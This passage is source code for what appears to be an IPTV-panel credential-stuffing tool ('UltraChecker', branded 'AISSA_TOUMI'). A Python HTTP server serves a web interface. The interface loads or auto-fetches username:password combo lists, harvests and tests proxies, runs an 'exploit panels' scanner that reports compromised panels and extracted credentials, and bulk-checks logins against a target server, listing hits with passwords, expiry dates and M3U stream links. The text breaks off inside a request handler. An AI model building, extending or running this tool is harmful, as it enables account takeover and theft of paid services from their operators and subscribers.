    <span style="color:var(--dim)">📶 Worker</span>
  </div>
</div>
<div class="card">
  <div class="card-title">🖥️ SERVER CONFIGURATION</div>
  <label>SERVER URL</label>
  <div style="display:flex;gap:8px">
    <input type="text" id="inHost" placeholder="example.com:8080">
    <button class="btn" style="padding:10px 14px">🔍</button>
    <button class="btn rd" style="padding:10px 14px" onclick="document.getElementById('inHost').value=''">✖</button>
  </div>
  <div class="row" style="margin-top:16px">
    <div>
      <div class="card-title green" style="position:static;padding:0;margin-bottom:6px;display:inline-block">💾 COMBO SOURCE</div>
      <select id="comboPreset">
        <option value="local">📂 Local Storage</option>
        <option value="github">🌐 GitHub (Dynamic)</option>
      </select>
      <div class="dropzone" id="dropzone">📁 UPLOAD COMBO .TXT</div>
      <input type="file" id="fileInput" accept=".txt" style="display:none">
      <div class="tiny" id="fileInfo" style="font-size:10px;color:var(--dim);margin-top:6px">No combo loaded</div>
      <textarea id="inComboSource" placeholder="Or paste raw text here..." style="margin-top:8px;height:60px;font-size:11px"></textarea>
      <label style="font-size:9px;margin-top:6px">PANEL URLS (One per line)</label>
      <textarea id="inComboUrls" placeholder="http://example.com/get.php" style="margin-top:2px;height:40px;font-size:11px"></textarea>
      <div style="display:flex;gap:8px;margin-top:8px;flex-wrap:wrap">
        <button class="btn" id="btnAutoGen" style="flex:1;font-size:10px;padding:6px;background:rgba(34,197,94,.1)">⚡ FETCH COMBOS & DOWNLOAD</button>
        <button class="btn or" id="btnExploit" style="flex:1;font-size:10px;padding:6px">☠️ EXPLOIT PANELS</button>
      </div>
      <div style="display:flex;gap:8px;margin-top:8px;flex-wrap:wrap">
        <button class="btn cy" id="btnExtractCombo" style="flex:1;font-size:10px;padding:6px">EXTRACT</button>
        <button class="btn or" id="btnAnalyzeCombo" style="flex:1;font-size:10px;padding:6px">ANALYZE</button>
      </div>
      <div style="margin-top:8px">
        <button class="btn cy hidden" id="btnDownloadCombo" style="width:100%;font-size:10px;padding:6px">📥 DOWNLOAD FETCHED COMBO</button>
      </div>
    </div>
    <div>
      <div class="card-title orange" style="position:static;padding:0;margin-bottom:6px;display:inline-block">🔒 PROXY SOURCE</div>
      <select id="proxySource">
        <option value="none">🚫 No Proxy</option>
        <option value="http">HTTP only</option>
        <option value="socks">SOCKS only</option>
      </select>
      <div class="dropzone" id="proxyDropzone">📁 UPLOAD PROXY .TXT</div>
      <input type="file" id="proxyFileInput" accept=".txt" style="display:none">
      <div class="tiny" id="proxyInfo" style="font-size:10px;color:var(--dim);margin-top:6px">Direct connection (no proxy)</div>
      <div style="display:flex;gap:8px;margin-top:8px">
        <button class="btn cy" id="btnProxyFetch" style="flex:1;font-size:10px;padding:6px">FETCH PROXIES</button>
        <button class="btn rd" id="btnProxyClear" style="flex:0;padding:6px 10px">CLEAR</button>
      </div>
    </div>
  </div>
</div>
<div class="card">
  <div class="card-title orange">⚙️ SCANNER CONFIGURATION</div>
  <label>BOTS SPEED</label>
  <input type="number" id="inThreads" value="150" min="1" max="1000">
</div>
<textarea id="inBulk" style="display:none"></textarea>
<div class="card">
  <div class="card-title orange">📊 REAL-TIME STATISTICS</div>
  <div class="stats">
    <div class="stat hits"><div class="k">HITS</div><div class="v" id="stHits">0</div></div>
    <div class="stat fails"><div class="k">FAILS</div><div class="v" id="stFails">0</div></div>
    <div class="stat chk"><div class="k">CHECKED</div><div class="v" id="stChk">0</div></div>
    <div class="stat rem"><div class="k">REMAINING</div><div class="v" id="stRem">0</div></div>
    <div class="stat tot"><div class="k">TOTAL</div><div class="v" id="stTot">0</div></div>
    <div class="stat spd"><div class="k">SPEED</div><div class="v" id="stSpd">0/s</div></div>
  </div>
  <div class="progress-wrap">
    <div class="progress"><div class="bar" id="progBar"></div></div>
    <div class="progress-text" id="progPct">0.0%</div>
  </div>
</div>
<div style="display:flex;gap:12px;margin-bottom:16px">
  <button class="btn" id="btnBulkStart">▶ START SCAN</button>
  <button class="btn or" id="btnBulkPause" disabled>⏸ PAUSE</button>
  <button class="btn rd" id="btnBulkStop" disabled>⏹ STOP</button>
  <button class="btn cy" id="btnSave">💾 SAVE HITS</button>
  <button class="btn rd" id="btnClear">🗑 CLEAR ALL</button>
</div>
<div class="card">
  <div class="card-title green">💻 SCAN LOG</div>
  <div class="log-container" id="log">
    <div style="text-align:center;color:var(--dim);margin-top:100px">Waiting for input... |</div>
  </div>
</div>
<div class="card">
  <div class="card-title green">🎯 HITS</div>
  <div class="hit-frame" id="hitFrame">
    <div class="tiny" id="resEmpty" style="text-align:center;color:var(--dim);margin-top:180px">No results yet.</div>
    <div class="hit-list" id="hitList"></div>
  </div>
</div>
</div>
<script>
const API={
  forgeCombos:'/api/bulk-stream',
  proxyFetch:'/api/proxy/fetch',
  proxyUpload:'/api/proxy/upload',
  proxyClear:'/api/proxy/clear',
  saveTxt:'/api/save-txt',
  harvest:'/api/harvest',
  analyze:'/api/analyze-combos',
  extract:'/api/extract-credentials',
  autogen:'/api/generate-auto-combos',
  exploit:'/api/scan-exploit',
  stats:'/api/stats',
  toggleM3U:'/api/toggle-m3u',
  downloadCombo:'/api/download/file?name=fetched_combos.txt'
};
const MAX_HIT_DOM=200, MAX_LOG_DOM=300;
let hitsStore=[], ctrl=null, currentHost='', startTime=0;
let checked=0, hitsCount=0, failsCount=0, total=0;
const logQueue=[], hitQueue=[];
let pendingStats=false, lastRender=0;
const $=id=>document.getElementById(id);
function esc(s){return String(s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]))}
function escAttr(s){return esc(String(s)).replace(/`/g,'&#96;')}
function queueLog(msg,cls){ logQueue.push({msg,cls}); scheduleRender(); }
function queueHit(hit,idx){ hitQueue.push({hit,idx}); scheduleRender(); }
function scheduleRender(){
  const now=Date.now();
  if(now-lastRender>200){ renderNow(); lastRender=now; }
  else if(!pendingStats){ pendingStats=true; setTimeout(()=>{pendingStats=false;lastRender=Date.now();renderNow();},200); }
}
function isNearBottom(el,pad=60){ return el.scrollTop + el.clientHeight >= el.scrollHeight - pad; }
function renderNow(){
  if(logQueue.length){
    const logEl=$('log');
    if(logEl.innerText.includes('Waiting for input')) logEl.innerHTML='';
    const near=isNearBottom(logEl,80);
    const frag=document.createDocumentFragment();
    for(const e of logQueue.splice(0,50)){
      const d=document.createElement('div');d.className='log-line '+e.cls;
      d.textContent=`[${new Date().toLocaleTimeString('en-GB')}] ${e.msg}`;
      frag.appendChild(d);
    }
    logEl.appendChild(frag);
    while(logEl.children.length>MAX_LOG_DOM) logEl.removeChild(logEl.firstChild);
    if(near) logEl.scrollTop=logEl.scrollHeight;
  }
  if(hitQueue.length){
    const frame=$('hitFrame'); const list=$('hitList');
    const near=isNearBottom(frame,120);
    const frag=document.createDocumentFragment();
    for(const {hit,idx} of hitQueue.splice(0,20)){
      frag.appendChild(buildHitCard(hit,idx)); hitsStore.push(hit);
    }
    list.appendChild(frag);
    while(list.children.length>MAX_HIT_DOM) list.removeChild(list.firstChild);
    $('resEmpty').style.display='none';
    if(near) frame.scrollTop=frame.scrollHeight;
  }
  $('stChk').textContent=checked; $('stTot').textContent=total;
  $('stHits').textContent=hitsCount; $('stFails').textContent=failsCount;
  $('stRem').textContent=Math.max(0,total-checked);
  const pct=total?((checked/total)*100):0;
  $('progBar').style.width=pct.toFixed(1)+'%';
  $('progPct').textContent=pct.toFixed(1)+'%';
  const dt=(Date.now()-startTime)/1000;
  $('stSpd').textContent=dt>0?Math.round(checked/dt)+'/s':'0/s';
}
function buildHitCard(h,idx){
  const days=h.days_left;
  const isExp=(days===0&&h.expiry!=='Unlimited');
  const daysLabel=(h.expiry==='Unlimited')?'∞ Days':(days===null?'? Days':(isExp?'0 Days':(days+' Days')));
  const card=document.createElement('div');card.className='hit-item';
  const live = (h.live===null||h.live===undefined)?'?':h.live;
  const vod  = (h.vod===null||h.vod===undefined)?'?':h.vod;
  const ser  = (h.series===null||h.series===undefined)?'?':h.series;
  card.innerHTML=`<div class="idx">#${idx}</div>
<div><span class="badge ${isExp?'inactive':''}">${isExp?'EXPIRED':'ACTIVE'}</span>
<span class="days" style="color:var(--red);font-weight:800;font-size:12px;margin-left:8px">${daysLabel}</span></div>
<div class="kv"><div class="k">HOST</div><div class="v">${esc(h.host)}</div><button class="copy" data-copy="${escAttr(h.host)}">COPY</button></div>
<div class="kv"><div class="k">USER</div><div class="v">${esc(h.user)}</div><button class="copy" data-copy="${escAttr(h.user)}">COPY</button></div>
<div class="kv"><div class="k">PASS</div><div class="v">${esc(h.pass)}</div><button class="copy" data-copy="${escAttr(h.pass)}">COPY</button></div>
<div class="kv"><div class="k">EXPIRE</div><div class="v">${esc(h.expiry)}</div><div></div></div>
<div class="kv"><div class="k">CONNECTIONS</div><div class="v">${esc(h.active_cons)}/${esc(h.max_connections)}</div><div></div></div>
<div class="kv"><div class="k">SERVER IP</div><div class="v">${esc(h.server_ip)}</div><div></div></div>
<div class="kv"><div class="k">COUNTRY</div><div class="v">${esc(h.timezone)}</div><div></div></div>
<div class="cgrid" style="display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-top:12px">
<div class="cbox" style="background:rgba(8,17,13,.9);border:1px solid var(--line);border-radius:6px;padding:8px;text-align:center"><div class="n" style="font-size:16px;font-weight:800;color:var(--neon)">${live}</div><div class="l" style="font-size:9px;color:var(--dim);letter-spacing:1px;margin-top:2px">LIVE</div></div>
<div class="cbox" style="background:rgba(8,17,13,.9);border:1px solid var(--line);border-radius:6px;padding:8px;text-align:center"><div class="n" style="font-size:16px;font-weight:800;color:var(--cyan)">${vod}</div><div class="l" style="font-size:9px;color:var(--dim);letter-spacing:1px;margin-top:2px">MOVIES</div></div>
<div class="cbox" style="background:rgba(8,17,13,.9);border:1px solid var(--line);border-radius:6px;padding:8px;text-align:center"><div class="n" style="font-size:16px;font-weight:800;color:var(--orange)">${ser}</div><div class="l" style="font-size:9px;color:var(--dim);letter-spacing:1px;margin-top:2px">SERIES</div></div></div>
<div style="margin-top:12px"><button class="btn copy" style="font-size:10px;padding:6px 12px" data-copy="${escAttr(h.m3u)}">COPY M3U</button></div>`;
  card.querySelectorAll('.copy').forEach(b=>b.onclick=()=>{
    navigator.clipboard.writeText(b.dataset.copy).then(()=>queueLog('Copied to clipboard','ok')).catch(()=>{});
  });
  return card;
}
const dz=$('dropzone'),fi=$('fileInput');dz.onclick=()=>fi.click();
dz.addEventListener('dragover',e=>{e.preventDefault();dz.style.borderColor='var(--cyan)'});
dz.addEventListener('dragleave',()=>dz.style.borderColor='var(--line)');
dz.addEventListener('drop',e=>{e.preventDefault();dz.style.borderColor='var(--line)';if(e.dataTransfer.files.length)readComboFile(e.dataTransfer.files[0])});
fi.onchange=e=>{if(e.target.files.length)readComboFile(e.target.files[0])};
function readComboFile(f){
  const r=new FileReader();
  r.onload=ev=>{
    $('inComboSource').value=ev.target.result;
    $('inBulk').value=ev.target.result;
    const n=ev.target.result.split('\n').filter(l=>l.trim()).length;
    $('fileInfo').textContent=`Loaded: ${f.name} (${n} lines)`;
    queueLog(`Combo loaded: ${f.name} - ${n} lines`,'ok');
  };
  r.readAsText(f);
}
const pdz=$('proxyDropzone'),pfi=$('proxyFileInput');pdz.onclick=()=>pfi.click();
pdz.addEventListener('dragover',e=>{e.preventDefault();pdz.style.borderColor='var(--cyan)'});
pdz.addEventListener('dragleave',()=>pdz.style.borderColor='var(--line)');
pdz.addEventListener('drop',e=>{e.preventDefault();pdz.style.borderColor='var(--line)';if(e.dataTransfer.files.length)uploadProxy(e.dataTransfer.files[0])});
pfi.onchange=e=>{if(e.target.files.length)uploadProxy(e.target.files[0])};
async function uploadProxy(f){
  $('proxyInfo').textContent=`Uploading ${f.name}...`;
  const fd=new FormData();fd.append('file',f);
  try{const r=await fetch(API.proxyUpload,{method:'POST',body:fd});const j=await r.json();
  if(j.ok){$('proxyInfo').textContent=`Pool: ${j.count} alive / ${j.scraped}`;queueLog(`Proxy: ${j.count} alive`,'ok')}}
  catch(e){queueLog('Upload error: '+e,'err')}
}
$('btnToggleM3U').onclick=async()=>{
  try{
    const r=await fetch(API.toggleM3U,{method:'POST',headers:{'Content-Type':'application/json'}});
    const j=await r.json();
    if(j.ok){
      const b=$('btnToggleM3U');
      b.textContent = j.enabled ? 'M3U: ON' : 'M3U: OFF';
      b.style.borderColor = j.enabled ? 'var(--orange)' : 'var(--cyan)';
      b.style.color = j.enabled ? 'var(--orange)' : 'var(--cyan)';
      queueLog(`M3U fallback: ${j.enabled?'ON':'OFF'}`, j.enabled?'warn':'info');
    }
  }catch(e){queueLog('Toggle M3U error: '+e,'err')}
};
$('btnProxyFetch').onclick=async()=>{
  $('proxyInfo').textContent=`Extracting uncapped alive pool...`;queueLog(`Extract uncapped target started`,'info');
  try{const r=await fetch(API.harvest,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({extra_sources:[]})});
  const j=await r.json();if(j.ok){
    $('proxyInfo').textContent=`Pool: ${j.proxies.length} scraped from sources`;
    queueLog(`Harvest complete. Proxies: ${j.proxies.length}`,j.proxies.length?'ok':'warn');
  }}
  catch(e){queueLog('Harvest error: '+e,'err')}
};
$('btnProxyClear').onclick=async()=>{try{await fetch(API.proxyClear,{method:'POST'});
  $('proxyInfo').textContent='Pool cleared';queueLog('Pool cleared','warn')}catch(e){}};
$('btnAutoGen').onclick=async()=>{
  $('btnAutoGen').disabled=true;
  queueLog(`Starting dynamic source fetch...`,'info');
  try{
    const r=await fetch(API.autogen,{method:'POST',headers:{'Content-Type':'application/json'}});
    if(!r.body)throw new Error('no stream');
    const reader=r.body.getReader();const dec=new TextDecoder();let buf='';
    while(true){
      const {value,done}=await reader.read();if(done)break;
      buf+=dec.decode(value,{stream:true});let i;
      while((i=buf.indexOf('\n'))>=0){
        const line=buf.slice(0,i);buf=buf.slice(i+1);if(!line.trim())continue;
        try{const ev=JSON.parse(line);
          if(ev.type==='info') queueLog(ev.msg,'info');
          else if(ev.type==='done'){
             if(ev.data && ev.data.creds && ev.data.creds.length > 0){
                 $('inBulk').value=ev.data.creds.map(c=>`${c.user}:${c.pass}`).join('\n');
                 queueLog(`Loaded ${ev.data.creds.length} combos into scanner.`, 'ok');
                 queueLog(`Sources: ok=${ev.data.sources_ok||0} fail=${ev.data.sources_fail||0}`, 'info');
                 $('btnDownloadCombo').classList.remove('hidden');
             } else {
                 queueLog(`No combos found. Try again later.`, 'warn');
             }
          }
        }catch(e){}
      }
    }
  }catch(e){queueLog('AutoGen error: '+e,'err')}
  finally{$('btnAutoGen').disabled=false;}
};
$('btnDownloadCombo').onclick=()=>{
    window.location.href = API.downloadCombo;
    queueLog('Downloading fetched_combos.txt', 'ok');
};
$('btnExploit').onclick=async()=>{
  const panelsRaw=$('inComboUrls').value;
  let panels=panelsRaw.split('\n').map(s=>s.trim()).filter(Boolean);
  if(!panels.length){
     queueLog(`No manual panels. Using Auto-generated list...`,'warn');
     panels = ["http://example.com:8080"];
  }
  $('btnExploit').disabled=true;
  queueLog(`Starting Exploit Scanner on ${panels.length} panels...`,'info');
  try{
    const r=await fetch(API.exploit,{method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({panels})});
    if(!r.body)throw new Error('no stream');
    const reader=r.body.getReader();const dec=new TextDecoder();let buf='';
    while(true){
      const {value,done}=await reader.read();if(done)break;
      buf+=dec.decode(value,{stream:true});let i;
      while((i=buf.indexOf('\n'))>=0){
        const line=buf.slice(0,i);buf=buf.slice(i+1);if(!line.trim())continue;
        try{const ev=JSON.parse(line);
          if(ev.type==='info') queueLog(ev.msg,'info');
          else if(ev.type==='done'){
             queueLog(`Scan Complete. Compromised: ${ev.compromised} | Extracted: ${ev.creds}`,'ok');
             if(ev.data && ev.data.creds){
                 const lines = ev.data.creds.map(c=>`${c.user}:${c.pass}`);
                 $('inBulk').value=lines.join('\n');
                 queueLog(`Loaded ${lines.length} creds.`, 'ok');
                 if(ev.data.panels_compromised && ev.data.panels_compromised.length){
                     $('inHost').value=ev.data.panels_compromised[0].replace(/^https?:\/\//,'').replace(/\/$/,'');
                 }
             }
          }
        }catch(e){}
      }
    }
  }catch(e){queueLog('Exploit error: '+e,'err')}
  finally{$('btnExploit').disabled=false;}
};
$('btnExtractCombo').onclick=async()=>{
  const sourceText=$('inComboSource').value;
  const panelUrlsRaw=$('inComboUrls').value;
  const preset=$('comboPreset').value;
  const urls=panelUrlsRaw.split('\n').map(s=>s.trim()).filter(Boolean);
  if(!sourceText && !urls.length) return queueLog('No source text or URLs provided','warn');
  $('btnExtractCombo').disabled=true;
  queueLog(`Extracting credentials (preset: ${preset} + all)...`,'info');
  try{
    const r=await fetch(API.extract,{method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({source_text:sourceText, panel_urls:urls, pattern_preset:preset})});
    const j=await r.json();
    if(j.credentials){
      const lines=j.credentials.map(c=>`${c.user}:${c.pass}`);
      $('inBulk').value=lines.join('\n');
      queueLog(`Extracted ${j.count} credentials.`,j.count?'ok':'warn');
      if(j.errors.length){
        queueLog(`Source errors: ${j.errors.length}`, 'warn');
        j.errors.forEach(e=>queueLog(`Error: ${e.url} - ${e.error}`,'err'));
      }
    } else queueLog('Extraction failed: '+(j.error||'unknown'),'err');
  }catch(e){queueLog('Extract error: '+e,'err')}
  finally{$('btnExtractCombo').disabled=false;}
};
$('btnAnalyzeCombo').onclick=async()=>{
  const lines=$('inBulk').value.split('\n').map(s=>s.trim()).filter(Boolean);
  if(!lines.length) return queueLog('No combos in main scanner to analyze.','warn');
  queueLog('Analyzing combo patterns...','info');
  try{
    const r=await fetch(API.analyze,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lines})});
    const j=await r.json();
    if(j.ok){
      queueLog(`Analyzed ${j.total} valid pairs (${j.invalid} invalid).`,'ok');
      queueLog(`Likely pattern: ${j.likely_pattern} | Weak: ${j.weak_count} | Dup users: ${j.dup_users}`,'info');
      queueLog(`User common prefix: "${j.user_common_prefix}" | suffix: "${j.user_common_suffix}"`,'info');
      queueLog(`Pass common prefix: "${j.pass_common_prefix}" | suffix: "${j.pass_common_suffix}"`,'info');
      queueLog(`User length distribution: ${JSON.stringify(j.user_len_dist)}`,'info');
      queueLog(`Pass length distribution: ${JSON.stringify(j.pass_len_dist)}`,'info');
      queueLog(`Identical user:pass count: ${j.identical_user_pass}`,'info');
    } else queueLog('Analyzer failed: '+(j.error||'?'),'err');
  }catch(e){queueLog('Analyzer error: '+e,'err')}
};
$('btnBulkStart').onclick=async()=>{
  const host=$('inHost').value.trim().replace(/^https?:\/\//,'').replace(/\/$/,'');
  if(!host)return queueLog('Fill SERVER URL first','warn');
  const lines=$('inBulk').value.split('\n').map(s=>s.trim()).filter(Boolean);
  if(!lines.length)return queueLog('No combo loaded.','warn');
  const seen=new Set();const creds=[];
  for(const l of lines){const i=l.indexOf(':');if(i<1)continue;
    const u=l.slice(0,i).trim(),p=l.slice(i+1).trim();
    if(!u||!p)continue;
    const k=u+'\u0000'+p;
    if(seen.has(k))continue;seen.add(k);
    creds.push({user:u,pass:p});
  }
  if(!creds.length)return queueLog('No valid user:pass lines','warn');
  currentHost=host;const conc=parseInt($('inThreads').value)||150;
  hitsStore=[];$('hitList').innerHTML='';$('resEmpty').style.display='block';
  checked=0;hitsCount=0;failsCount=0;total=creds.length;startTime=Date.now();
  $('btnBulkStart').disabled=true;$('btnBulkStop').disabled=false;
  $('statusDot').className='dot connected';$('statusText').textContent='CONNECTED';
  renderNow();
  queueLog(`START - ${creds.length} creds @ ${host} (bots=${conc})`,'info');
  ctrl=new AbortController();
  try{
    const r=await fetch(API.forgeCombos,{method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({host,creds,concurrency:conc}),signal:ctrl.signal});
    if(!r.body)throw new Error('no stream');
    const reader=r.body.getReader();const dec=new TextDecoder();let buf='';
    while(true){
      const {value,done}=await reader.read();if(done)break;
      buf+=dec.decode(value,{stream:true});let i;
      while((i=buf.indexOf('\n'))>=0){
        const line=buf.slice(0,i);buf=buf.slice(i+1);if(!line.trim())continue;
        try{const ev=JSON.parse(line);
          if(ev.type==='progress'){checked=ev.done}
          else if(ev.type==='hit'){hitsCount++;queueHit(ev.hit,hitsCount);queueLog(`HIT ${ev.hit.user}:${ev.hit.pass} (${ev.latency_ms||'?'}ms)`,'ok')}
          else if(ev.type==='error'){failsCount++;queueLog(`FAIL ${ev.user}:${ev.pass} - ${ev.reason||'?'}`,'err')}
          else if(ev.type==='done'){queueLog(`DONE - ${ev.checked} checked, ${ev.hits} hits`,ev.hits?'ok':'warn')}
        }catch(e){}
      }
    }
  }catch(e){if(e.name==='AbortError')queueLog('STOP by user','warn');else queueLog('Stream error: '+e,'err')}
  finally{$('btnBulkStart').disabled=false;$('btnBulkStop').disabled=true;
    $('statusDot').className='dot';$('statusText').textContent='DISCONNECTED';renderNow()}
};
$('btnBulkStop').onclick=()=>{if(ctrl){try{ctrl.abort()}catch(e){}}queueLog('STOP requested','warn')};
$('btnClear').onclick=()=>{hitsStore=[];$('hitList').innerHTML='';$('resEmpty').style.display='block';
  checked=hitsCount=failsCount=total=0;renderNow();queueLog('Cleared','warn')};
$('btnSave').onclick=async()=>{
  if(!hitsStore.length)return queueLog('No hits','warn');
  const host=currentHost||'unknown_host';
  try{const r=await fetch(API.saveTxt,{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({host,hits:hitsStore})});
  const j=await r.json();if(j.ok&&j.url){window.location.href=j.url;queueLog(`Saved ${j.filename}`,'ok')}
  else queueLog('Save failed','err')}catch(e){queueLog('Save error: '+e,'err')}
};
queueLog('AISSA_TOUMI v7.3.6 ready','ok');
</script></body></html>
"""

def _find_bg_image():
    for name in BG_FILE_CANDIDATES:
        p = os.path.join(os.path.dirname(os.path.abspath(__file__)), name)
        if os.path.isfile(p): return p
    for name in BG_FILE_CANDIDATES:
        p = os.path.join(os.getcwd(), name)
        if os.path.isfile(p): return p
    return None

URL_RE = re.compile(r"^https?://", re.I)
def _valid_url(s):
    return bool(s) and bool(URL_RE.match(s))
def _valid_proxy_line(s):
    if not s or ":" not in s: return False
    hp = s.split("://",1)[-1].split("@")[-1]
    if ":" not in hp: return False
    host, port = hp.rsplit(":",1)
    if not host or not port.isdigit(): return False
    if not (1024 <= int(port) <= 65500): return False
    return is_valid_ip(host) or bool(re.match(r"^[a-zA-Z0-9.\-]+$", host))

class Handler(BaseHTTPRequestHandler):
    server_version = f"UltraChecker/{TOOL_VERSION}"; protocol_version = "HTTP/1.1"
    def log_message(self, fmt, *args): return
    def _send(self, code, body, ctype="application/json; charset=utf-8", extra=None):
        if isinstance(body, str): body=body.encode("utf-8")
        self.send_response(code); self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Access-Control-Allow-Origin","*")
        self.send_header("Access-Control-Allow-Methods","GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers","Content-Type")
        self.send_header("Cache-Control","no-cache")
        if extra:
            for k,v in extra.items(): self.send_header(k,v)
        self.end_headers()
        try: self.wfile.write(body)
        except BrokenPipeError: pass
    def _json(self,code,obj): self._send(code,json.dumps(obj,ensure_ascii=False))
    def _serve_file(self,path):
        if not os.path.isfile(path): self._send(404,"Not Found","text/plain"); return
        try:
            with open(path,"rb") as f: data=f.read()
        except OSError as e: log_exc("serve_file",e,path); self._send(500,"Read error","text/plain"); return
        fname=os.path.basename(path); ctype="application/octet-stream"; low=path.lower()
        if low.endswith((".jpg",".jpeg")): ctype="image/jpeg"
        elif low.endswith(".png"): ctype="image/png"
        elif low.endswith(".webp"): ctype="image/webp"
        elif low.endswith(".txt"): ctype="text/plain; charset=utf-8"
        elif low.endswith(".jsonl"): ctype="application/jsonlines; charset=utf-8"
        elif low.endswith(".csv"): ctype="text/csv; charset=utf-8"
        self._send(200,data,ctype,{"Content-Disposition":f'attachment; filename="{fname}"'})
    def _serve_image_inline(self,path):
        if not os.path.isfile(path): self._send(404,"Not Found","text/plain"); return
        try:
            with open(path,"rb") as f: data=f.read()
        except OSError as e: log_exc("serve_bg",e,path); self._send(500,"Read error","text/plain"); return
        low=path.lower(); ctype="application/octet-stream"
        if low.endswith((".jpg",".jpeg")): ctype="image/jpeg"
        elif low.endswith(".png"): ctype="image/png"
        elif low.endswith(".webp"): ctype="image/webp"
        self._send(200,data,ctype)
    def do_OPTIONS(self): self._send(204,b"")
    def do_GET(self):
        p=urlparse(self.path); qs=parse_qs(p.query)
        if p.path in ("/","/index.html"): self._send(200,HTML_UI,"text/html; charset=utf-8"); return
        if p.path == "/background.jpg":
            bg=_find_bg_image()
            if bg: self._serve_image_inline(bg)
            else: self._send(404,"no bg","text/plain")
            return
        if p.path=="/health":
            self._json(200,{"ok":True,"version":TOOL_VERSION,"pool_size":len(proxy_pool),
                            "bg":bool(_find_bg_image()),
                            "m3u_fallback": bool(ENABLE_M3U_FALLBACK),
                            "runs":len(RUNS)}); return
        if p.path=="/api/stats":
            try:
                conn=init_db(); c=conn.cursor()
                c.execute("SELECT COUNT(*) FROM hits"); hits_n=c.fetchone()[0]
                c.execute("SELECT COUNT(*) FROM combos"); combos_n=c.fetchone()[0]
                conn.close()
            except Exception:
                hits_n=-1; combos_n=-1
            self._json(200,{"ok":True,"version":TOOL_VERSION,
                            "pool_size":len(proxy_pool),
                            "runs":len(RUNS),
                            "hits_total":hits_n,
                            "combos_total":combos_n,
                            "m3u_fallback": bool(ENABLE_M3U_FALLBACK),
                            "uptime_s":int(time.time()-PROCESS_START)})
            return
        if p.path=="/api/progress":
            run_id=(qs.get("run_id",[""])[0]).strip()
            if not run_id: self._json(400,{"ok":False,"reason":"missing run_id"}); return
            with RUNS_LOCK:
                st=RUNS.get(run_id)
                if not st: self._json(404,{"ok":False,"reason":"unknown_run"}); return
                self._json(200,{"ok":True,"run_id":run_id,
                                "cancelled":st["cancelled"],
                                "progress":dict(st["progress"]),
                                "has_checkpoint":st["checkpoint"] is not None})
            return
        if p.path=="/api/download/hits":
            host=(qs.get("host",[""])[0]).strip()
            if not host: self._send(400,"missing host","text/plain"); return
            base=_host_to_filename(host); cand=None; bestn=-1
            pat1=re.compile(rf"^{re.escape(base)}_(\d+)hits\.txt$")
            pat2=re.compile(rf"^{re.escape(base)}_.*_(\d+)hits\.txt$")
            pat3=re.compile(rf"^{re.escape(base)}_\d{{8}}_\d{{6}}\.txt$")
            try:
                for f in os.listdir("."):
                    m=pat1.match(f) or pat2.match(f)
                    if m:
                        n=int(m.group(1))
                        if n>bestn: bestn=n; cand=f
                    elif pat3.match(f):
                        if bestn<0: cand=f
            except OSError: pass
            if not cand: self._send(404,"no hits yet","text/plain"); return
            self._serve_file(cand); return
        if p.path=="/api/download/file":
            fname=os.path.basename((qs.get("name",[""])[0]).strip())
            if not fname: self._send(400,"missing name","text/plain"); return
            self._serve_file(fname); return
        self._send(404,"Not Found","text/plain")
    def do_POST(self):
        global ENABLE_M3U_FALLBACK
        p=urlparse(self.path); path=p.path
        if path=="/api/proxy/upload":
            try:
                length=int(self.headers.get("Content-Length","0") or "0")
                if length<=0: self._json(400,{"ok":False,"reason":"empty"}); return
                raw=self.rfile.read(length); text=raw.decode("utf-8",errors="ignore")
                if "\r\n\r\n" in text: text=text.split("\r\n\r\n",1)[1]
                elif "\n\n" in text: text=text.split("\n\n",1)[1]
                proxies=list({x for x in (_normalize_proxy_line(l) for l in text.splitlines()) if x})
                proxies=ensure_socks_support(proxies)
                tcp_ok=test_many(tcp_alive,proxies,PROXY_TCP_THREADS,PROXY_TCP_TIMEOUT)
                alive=[]
                with ThreadPoolExecutor(max_workers=PROXY_HTTP_THREADS) as ex:
                    futs={ex.submit(http_alive,x,PROXY_HTTP_TIMEOUT):x for x in tcp_ok}
                    for f in as_completed(futs):
                        try:
                            if f.result(): alive.append(futs[f])
                        except Exception as e: log_exc("upload_http",e)
                save_alive_proxies(alive); set_pool(alive)
                self._json(200,{"ok":True,"count":len(alive),"scraped":len(proxies)})
            except Exception as e: log_exc("proxy_upload",e); self._json(500,{"ok":False,"reason":str(e)})
            return
        if path=="/api/proxy/clear": set_pool([]); self._json(200,{"ok":True}); return
        if path=="/api/proxy/test":
            try:
                cur=list(proxy_pool._list)
                if not cur: self._json(200,{"ok":True,"alive":0,"total":0}); return
                tcp_ok=test_many(tcp_alive,cur,PROXY_TCP_THREADS,PROXY_TCP_TIMEOUT)
                alive=[]
                with ThreadPoolExecutor(max_workers=PROXY_HTTP_THREADS) as ex:
                    futs={ex.submit(http_alive,x,PROXY_HTTP_TIMEOUT):x for x in tcp_ok}
                    for f in as_completed(futs):
                        try:
                            if f.result(): alive.append(futs[f])
                        except Exception as e: log_exc("proxy_test_http",e)
                set_pool(alive); save_alive_proxies(alive)
                self._json(200,{"ok":True,"alive":len(alive),"total":len(cur)})
            except Exception as e: log_exc("proxy_test",e); self._json(500,{"ok":False,"reason":str(e)})
            return
        if path=="/api/toggle-m3u":
            try:
                ENABLE_M3U_FALLBACK = not bool(ENABLE_M3U_FALLBACK)
                self._json(200,{"ok":True,"enabled": bool(ENABLE_M3U_FALLBACK)})
            except Exception as e:
                log_exc("toggle_m3u", e); self._json(500,{"ok":False,"reason":str(e)})
            return
        try:
            length=int(self.headers.get("Content-Length","0") or "0")
            raw=self.rfile.read(length) if length>0 else b"{}"
            payload=json.loads(raw.decode("utf-8") or "{}")
        except (ValueError,json.JSONDecodeError):
            self._json(400,{"ok":False,"reason":"bad json"}); return

        if path=="/api/cancel":
            run_id=str(payload.get("run_id","")).strip()
            if not run_id: self._json(400,{"ok":False,"reason":"missing run_id"}); return
            with RUNS_LOCK:
                st=RUNS.get(run_id)
                if st: st["cancelled"]=True
